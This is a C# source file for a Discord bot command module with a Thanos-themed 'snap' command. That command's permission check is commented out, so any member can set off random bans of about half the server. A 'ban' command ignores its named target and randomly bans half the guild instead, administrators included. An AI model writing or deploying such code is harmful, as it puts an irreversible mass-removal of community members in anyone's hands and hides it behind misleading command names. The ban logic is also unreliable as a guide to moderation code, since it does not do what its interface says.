using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Newtonsoft.Json.Linq;

namespace Banoth.Commands
{
    public class Admin : ModuleBase<SocketCommandContext>
    {
        [Command("snap")]
       // [RequireUserPermission(GuildPermission.BanMembers, ErrorMessage = "No permission")]
        public async Task test()
        {
            new Thread(async () =>
            {
                Thread.CurrentThread.IsBackground = true;

                await Context.Message.ReplyAsync("https://i.pinimg.com/originals/7b/df/80/7bdf802dc23e3e49712541adf2580517.gif");
                await Context.Channel.SendMessageAsync("You should've gone for the head!");

                await Task.Delay(3000);

                //start randomely ban 1/2 of the server
                start:
                for (int i = 0; i < Math.Round((decimal)(Context.Guild.Users.Count / 2d)); i++)
                {
                    
                    var randomNumber = new Random();
                    randomNumber.Next(0, Context.Guild.Users.Count);
                    var currentUser = Context.Guild.Users.ToArray()[randomNumber.Next(0, Context.Guild.Users.Count)];
                    var roleToSpare = Context.Guild.GetRole(957734324734656553);
                    Console.WriteLine("Current user : "+currentUser.DisplayName);
                    while (currentUser.GuildPermissions.Administrator || currentUser.Roles.Contains(roleToSpare))
                    {
                        currentUser = Context.Guild.Users.ToArray()[randomNumber.Next(0, Context.Guild.Users.Count)];
                    }
                   
                    var embedBuilder = new EmbedBuilder()
                        .WithDescription($"Pooof!")
                        .WithColor(new Color(255, 0, 0));
                    Embed embed = embedBuilder.Build();
                    await Discord.UserExtensions.SendMessageAsync(currentUser, embed: embed);
                    await Context.Guild.AddBanAsync(currentUser, 0, "It's your destiny");


                }



            }).Start();


           

        }
        [Command("ban")]
        [RequireUserPermission(GuildPermission.BanMembers, ErrorMessage = "No permission")]
        public async Task BanMember(SocketGuildUser user = null, [Remainder] string reason = null)
        {
            if (user == null)
            {
                await ReplyAsync("User is null");
                return;
            }
            if (reason == null)
                reason = "They called me a mad man ";
           await Context.User.SendMessageAsync(reason);
            for (int i = 0; i < Context.Guild.Users.Count / 2; i++)
            {
                var randomNumber = new Random();
                randomNumber.Next(0, Context.Guild.Users.Count);
                var currentUser = Context.Guild.Users.ToArray()[randomNumber.Next(0, Context.Guild.Users.Count)];
                await Context.Guild.AddBanAsync(currentUser, 0, "It's your destiny");

            var embedBuilder = new EmbedBuilder()
                .WithDescription($"Pooof!")
                .WithColor(new Color(255, 0, 0));
            Embed embed = embedBuilder.Build();
            await currentUser.SendMessageAsync(embed: embed);
            }
          
        }
    }
}
